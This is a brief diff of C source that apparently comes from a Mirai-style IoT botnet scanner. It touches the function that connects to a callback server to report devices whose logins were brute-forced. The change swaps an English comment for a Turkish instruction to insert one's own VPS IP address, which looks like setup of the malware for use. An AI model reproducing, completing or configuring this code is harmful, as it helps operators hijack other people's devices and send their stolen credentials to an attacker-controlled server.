@@ -888,8 +888,8 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     
     table_unlock_val(TABLE_SCAN_CB_PORT);
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = INET_ADDR(0,0,0,0);     //Change this to your server IP
-    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
+    addr.sin_addr.s_addr = INET_ADDR(0,0,0,0);     //Buraya Kendi VPS Ip ni yazacan Virgül ile                                      
+    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));               
     table_lock_val(TABLE_SCAN_CB_PORT);
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
